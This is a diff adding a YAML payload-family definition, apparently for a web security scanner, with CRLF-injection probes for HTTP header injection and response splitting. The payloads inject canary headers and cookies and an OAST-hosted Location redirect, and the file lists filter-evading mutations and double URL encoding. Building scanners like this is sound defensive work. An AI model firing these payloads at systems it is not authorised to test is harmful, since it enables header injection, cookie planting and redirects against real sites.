@@ -1,0 +1,51 @@
+family_id: crlf
+description: >-
+  CRLF-injection probes for HTTP-header injection and response-splitting
+  contexts. Conservative seeds embed a {canary} marker in injected headers
+  / cookies; OAST is recommended to confirm propagation downstream.
+cwe_ids: [93, 113]
+owasp_top10:
+  - 'A03:2021'
+risk_level: medium
+requires_approval: false
+oast_required: true
+payloads:
+  - id: header_inject_crlf
+    template: "%0d%0aX-Argus-Canary:%20{canary}"
+    confidence: likely
+    notes: Standard URL-encoded CRLF injecting a marker header.
+  - id: header_inject_lf_only
+    template: "%0aX-Argus-Canary:%20{canary}"
+    confidence: suspected
+    notes: LF-only variant; some servers normalise CR away.
+  - id: cookie_inject
+    template: "%0d%0aSet-Cookie:%20argus_canary={canary}"
+    confidence: likely
+    notes: Response-splitting cookie injection.
+  - id: location_inject
+    template: "%0d%0aLocation:%20https://{oast_host}/{canary}"
+    confidence: confirmed
+    notes: Cross-origin redirect via header injection; OAST confirms hit.
+  - id: raw_cr_lf
+    template: "\r\nX-Argus-Canary: {canary}"
+    confidence: suspected
+    notes: Raw CR/LF (server-side libraries that don't pre-encode).
+  - id: utf8_overlong_lf
+    template: "%c0%8aX-Argus-Canary:%20{canary}"
+    confidence: suspected
+    notes: Overlong-UTF8 CRLF; legacy parser bypass research.
+mutations:
+  - name: case_flip
+    description: HTTP headers are case-insensitive; flips defeat substring filters.
+  - name: whitespace_alt
+    description: Tab/space variants in the injected header value.
+encodings:
+  - name: identity
+    stages: []
+    description: Raw payload (header contexts that accept raw bytes).
+  - name: url_only
+    stages: [url]
+    description: URL-encoded for query-string sinks.
+  - name: url_double
+    stages: [url_double]
+    description: Double URL-encoded; bypasses one-pass-decoding gateways.
